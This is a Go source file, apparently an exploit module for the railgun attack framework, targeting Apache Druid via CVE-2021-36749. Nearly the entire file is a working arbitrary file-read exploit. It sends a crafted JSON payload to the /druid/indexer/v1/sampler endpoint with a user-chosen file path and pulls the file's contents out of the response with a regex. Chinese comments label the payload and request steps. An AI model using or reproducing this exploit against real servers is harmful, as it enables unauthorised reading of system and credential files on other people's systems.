package exp_Druid

import (
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"regexp"
	"strings"
)

type Exp_CVE_2021_36749 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2021_36749) Attack_read() (expResult exp_model.ExpResult) {

	headers := self.GetInitExpHeaders()             //获取header
	headers.Set("Content-Type", "application/json") //设置格式
	//设置poc
	payload := `{"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index", "firehose": {"type": "http", "uris": ["l1ang"]}}, "dataSchema": {"dataSource": "sample", "parser": {"type": "string", "parseSpec": {"format": "regex", "pattern": "(.*)", "columns": ["a"], "dimensionsSpec": {}, "timestampSpec": {"column": "!!!_no_such_column_!!!", "missingValue": "2010-01-01T00:00:00Z"}}}}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}`
	//替换poc
	payload = strings.Replace(payload, "l1ang", self.MustGetStringParam("path"), 1)

	//发送请求
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/druid/indexer/v1/sampler?for=connect"), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	tmp1, _ := regexp.Compile(`"input":{"a":"(.*?)"`)
	tmp2 := tmp1.FindAllString(httpresp.Body, -1)
	tmp3 := strings.Join(tmp2, "")
	tmp4 := strings.ReplaceAll(tmp3, `""input":{"a":"`, "\r\n")
	if len(tmp4) == 0 {
		self.EchoSuccessMsg("漏洞利用失败或文件不存在！！")
	} else {
		res := tmp4[14 : len(tmp4)-1]
		expResult.Result = res
	}
	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_CVE_2021_36749{}, "exp_CVE-2021-36749.yml")

}
